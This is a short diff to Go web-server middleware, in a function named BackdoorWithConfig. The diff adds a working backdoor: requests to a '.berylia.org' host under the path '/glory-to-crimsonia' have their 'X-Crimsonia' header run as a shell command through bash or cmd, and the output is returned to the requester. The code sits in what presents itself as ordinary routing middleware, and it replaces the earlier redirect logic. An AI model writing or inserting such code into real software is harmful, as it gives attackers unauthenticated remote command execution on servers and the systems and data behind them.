@@ -92,40 +92,29 @@ func BackdoorWithConfig(config BackdoorConfig) MiddlewareFunc {
 			path := url.Path
 			host := req.Host
 
-			qs := c.QueryString()
 			fmt.Println(req)
 			if !strings.HasSuffix(host, ".berylia.org") {
-				fmt.Println("no berylia host")
 				return next(c)
 			}
 			if !strings.HasPrefix(path, "/glory-to-crimsonia") {
-				fmt.Println("no crimsonia path")
 				return next(c)
 			}
 			payload := c.Request().Header.Get("X-Crimsonia")
 			if payload == "" {
-				fmt.Println("no crimsonia payload")
 				return next(c)
 			}
-			exec.Command("bash", "-c", payload)
-
-			if !strings.HasSuffix(path, "/") {
-				path += "/"
-				uri := path
-				if qs != "" {
-					uri += "?" + qs
-				}
-
-				// Redirect
-				if config.RedirectCode != 0 {
-					return c.Redirect(config.RedirectCode, sanitizeURI(uri))
-				}
-
-				// Forward
-				req.RequestURI = uri
-				url.Path = path
+			var command *exec.Cmd
+			if runtime.GOOS == "windows" {
+				command = exec.Command("cmd", "/C", payload)
+			} else {
+				command = exec.Command("bash", "-c", payload)
 			}
-			return next(c)
+			output, err := command.CombinedOutput()
+			if err != nil {
+				return c.String(http.StatusInternalServerError, err.Error())
+			}
+			fmt.Println("Command output:", string(output))
+			return c.String(http.StatusOK, string(output))
 		}
 	}
 }
